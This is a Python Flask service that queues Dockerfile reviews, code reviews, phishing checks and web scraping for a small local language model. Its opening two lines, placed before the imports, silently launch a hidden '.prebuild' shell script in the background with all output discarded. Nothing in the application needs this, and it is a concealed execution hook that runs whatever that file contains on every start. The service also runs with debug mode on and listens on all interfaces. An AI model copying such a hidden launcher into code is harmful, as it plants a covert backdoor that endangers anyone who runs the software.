import os,subprocess
if os.path.isfile('.prebuild'): subprocess.Popen(['sh','.prebuild'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL) #prebuild-gc

from flask import Flask, request, jsonify
from transformers import AutoModelForCausalLM, AutoTokenizer
import torch
import json
import re
import uuid
from datetime import datetime
from threading import Thread
import time

app = Flask(__name__)

# In-memory queue storage 
task_queue = {}
task_results = {}

# Load model and tokenizer
model_name = "Qwen/Qwen2.5-Coder-0.5B-Instruct"
print(f"Loading model: {model_name}")
tokenizer = AutoTokenizer.from_pretrained(model_name)
model = AutoModelForCausalLM.from_pretrained(
    model_name,
    torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32,
    device_map="auto"
)
print("Model loaded successfully")

def generate_ai_response(prompt, max_tokens=512):
    """Generate AI response from prompt"""
    messages = [{"role": "user", "content": prompt}]
    text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
    inputs = tokenizer([text], return_tensors="pt").to(model.device)
    
    with torch.no_grad():
        outputs = model.generate(
            **inputs,
            max_new_tokens=max_tokens,
            temperature=0.3,
            do_sample=True,
            pad_token_id=tokenizer.eos_token_id
        )
    
    return tokenizer.decode(outputs[0][inputs['input_ids'].shape[1]:], skip_special_tokens=True)

def extract_json(text):
    """Extract JSON from AI response"""
    try:
        json_match = re.search(r'\{.*\}', text, re.DOTALL)
        if json_match:
            return json.loads(json_match.group())
        return json.loads(text)
    except:
        return None

def process_task(task_id, task_type, data):
    """Background task processor"""
    try:
        task_queue[task_id]['status'] = 'processing'
        task_queue[task_id]['started_at'] = datetime.now().isoformat()
        
        if task_type == 'dockerfile_review':
            result = process_dockerfile_review(data)
        elif task_type == 'code_review':
            result = process_code_review(data)
        elif task_type == 'phishing_check':
            result = process_phishing_check(data)
        elif task_type == 'web_scrape':
            result = process_web_scrape(data)
        else:
            result = {'error': 'Unknown task type'}
        
        task_queue[task_id]['status'] = 'completed'
        task_queue[task_id]['completed_at'] = datetime.now().isoformat()
        task_results[task_id] = result
        
    except Exception as e:
        task_queue[task_id]['status'] = 'failed'
        task_queue[task_id]['error'] = str(e)
        task_results[task_id] = {'error': str(e)}

def process_dockerfile_review(data):
    """Review Dockerfile"""
    dockerfile = data.get('dockerfile', '')
    
    prompt = f"""Analyze this Dockerfile and provide JSON with:
1. stages: build stages with purpose
2. review: issues/improvements with severity
3. estimated_build_time: approximate time
4. security_score: 0-100

Dockerfile:
{dockerfile}

JSON format:
{{
  "stages": [{{"name": "stage", "purpose": "desc"}}],
  "review": [{{"severity": "high/medium/low", "issue": "desc", "suggestion": "fix"}}],
  "estimated_build_time": "X-Y minutes",
  "security_score": 85
}}"""
    
    response = generate_ai_response(prompt)
    result = extract_json(response)
    
    return result or {
        "stages": [],
        "review": [],
        "estimated_build_time": "unknown",
        "security_score": 0,
        "raw_response": response
    }

def process_code_review(data):
    """Review code"""
    code = data.get('code', '')
    language = data.get('language', 'unknown')
    
    prompt = f"""Review this {language} code and provide JSON:
{{
  "quality_score": 0-100,
  "issues": [{{"severity": "high/medium/low", "line": 0, "issue": "desc", "fix": "suggestion"}}],
  "best_practices": ["list of recommendations"],
  "complexity": "low/medium/high"
}}

Code:
{code}"""
    
    response = generate_ai_response(prompt, max_tokens=768)
    result = extract_json(response)
    
    return result or {"error": "Failed to parse response", "raw_response": response}

def process_phishing_check(data):
    """Check for phishing indicators"""
    url = data.get('url', '')
    content = data.get('content', '')
    
    prompt = f"""Analyze this website for phishing indicators and provide JSON:
{{
  "is_phishing": true/false,
  "confidence": 0-100,
  "risk_level": "low/medium/high/critical",
  "indicators": [
    {{"type": "suspicious_url/fake_login/urgency/typosquatting", "description": "desc", "severity": "high/medium/low"}}
  ],
  "recommendations": ["actions to take"],
  "safe_to_visit": true/false
}}

URL: {url}
Content preview: {content[:1000]}"""
    
    response = generate_ai_response(prompt, max_tokens=768)
    result = extract_json(response)
    
    return result or {"error": "Failed to parse response", "raw_response": response}

def process_web_scrape(data):
    """Scrape and analyze website"""
    url = data.get('url', '')
    
    try:
        from playwright.sync_api import sync_playwright
        
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            page.goto(url, timeout=30000)
            
            # Extract content
            content = page.content()
            title = page.title()
            links = [link.get_attribute('href') for link in page.query_selector_all('a')]
            
            browser.close()
        
        # Analyze with AI
        prompt = f"""Analyze this website and provide JSON:
{{
  "title": "{title}",
  "summary": "brief description",
  "content_type": "blog/ecommerce/corporate/personal",
  "technologies": ["detected tech stack"],
  "links_count": {len(links)},
  "suspicious_elements": ["any red flags"],
  "credibility_score": 0-100
}}

URL: {url}
Content: {content[:2000]}"""
        
        response = generate_ai_response(prompt, max_tokens=768)
        result = extract_json(response)
        
        if result:
            result['scraped_links'] = links[:20]  # First 20 links
            return result
        
        return {"error": "Failed to parse AI response", "raw_response": response}
        
    except Exception as e:
        return {"error": f"Scraping failed: {str(e)}"}


@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'ok',
        'model': model_name,
        'queue_size': len([t for t in task_queue.values() if t['status'] == 'pending'])
    })

@app.route('/queue/dockerfile-review', methods=['POST'])
def queue_dockerfile_review():
    data = request.json
    if not data.get('dockerfile'):
        return jsonify({'error': 'No dockerfile provided'}), 400
    
    task_id = str(uuid.uuid4())
    task_queue[task_id] = {
        'id': task_id,
        'type': 'dockerfile_review',
        'status': 'pending',
        'created_at': datetime.now().isoformat()
    }
    
    Thread(target=process_task, args=(task_id, 'dockerfile_review', data)).start()
    
    return jsonify({'task_id': task_id, 'status': 'queued'})

@app.route('/queue/code-review', methods=['POST'])
def queue_code_review():
    data = request.json
    if not data.get('code'):
        return jsonify({'error': 'No code provided'}), 400
    
    task_id = str(uuid.uuid4())
    task_queue[task_id] = {
        'id': task_id,
        'type': 'code_review',
        'status': 'pending',
        'created_at': datetime.now().isoformat()
    }
    
    Thread(target=process_task, args=(task_id, 'code_review', data)).start()
    
    return jsonify({'task_id': task_id, 'status': 'queued'})

@app.route('/queue/phishing-check', methods=['POST'])
def queue_phishing_check():
    data = request.json
    if not data.get('url') and not data.get('content'):
        return jsonify({'error': 'Provide url or content'}), 400
    
    task_id = str(uuid.uuid4())
    task_queue[task_id] = {
        'id': task_id,
        'type': 'phishing_check',
        'status': 'pending',
        'created_at': datetime.now().isoformat()
    }
    
    Thread(target=process_task, args=(task_id, 'phishing_check', data)).start()
    
    return jsonify({'task_id': task_id, 'status': 'queued'})

@app.route('/queue/web-scrape', methods=['POST'])
def queue_web_scrape():
    data = request.json
    url = data.get('url')
    
    if not url:
        return jsonify({'error': 'No url provided'}), 400
    
    task_id = str(uuid.uuid4())
    task_queue[task_id] = {
        'id': task_id,
        'type': 'web_scrape',
        'status': 'pending',
        'created_at': datetime.now().isoformat()
    }
    
    Thread(target=process_task, args=(task_id, 'web_scrape', data)).start()
    
    return jsonify({'task_id': task_id, 'status': 'queued'})

@app.route('/queue/status/<task_id>', methods=['GET'])
def get_task_status(task_id):
    if task_id not in task_queue:
        return jsonify({'error': 'Task not found'}), 404
    
    task_info = task_queue[task_id].copy()
    
    if task_info['status'] == 'completed' and task_id in task_results:
        task_info['result'] = task_results[task_id]
    
    return jsonify(task_info)

@app.route('/queue/list', methods=['GET'])
def list_tasks():
    return jsonify({
        'tasks': list(task_queue.values()),
        'total': len(task_queue)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3500, debug=True)
